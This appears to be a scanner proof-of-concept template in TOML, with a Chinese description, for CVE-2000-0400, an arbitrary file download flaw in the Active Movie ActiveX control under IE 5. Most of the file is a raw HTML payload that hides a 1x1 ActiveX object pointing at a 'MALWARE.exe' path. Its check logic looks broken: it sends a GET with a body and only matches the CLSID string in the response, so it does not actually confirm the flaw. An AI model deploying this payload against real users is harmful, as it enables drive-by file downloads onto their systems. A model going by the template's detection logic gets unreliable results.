[info]
author = "ave"
description = "通过嵌入 Active Movie ActiveX 控件（CLSID:05589FA1-C356-11CE-BF01-00AA0055595A）的 HTML 页面，设置 Filename 参数指向恶意可执行文件路径，当用户在 IE 5 中访问该页面时，控件会尝试将指定文件下载到用户系统，验证任意文件下载漏洞的存在。"
id = "POC-AVE-2000-0330"
name = "Microsoft Active Movie ActiveX Control 任意文件下载 PoC"
severity = "high"
tags = ["ave-2000-0330"]
vuln_id = [
    "CVE-2000-0400",
    "AVE-2000-0330",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/poc.html"
protocol = "http"

[poc.requests.body]
content = '''
<html>
<body>
<OBJECT classid="clsid:05589FA1-C356-11CE-BF01-00AA0055595A" height=1 style="DISPLAY: none" width=1>
<PARAM NAME="Filename" VALUE="C:\WINDOWS\TEMP\MALWARE.exe">
</OBJECT>
</body>
</html>'''
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["05589FA1-C356-11CE-BF01-00AA0055595A"]
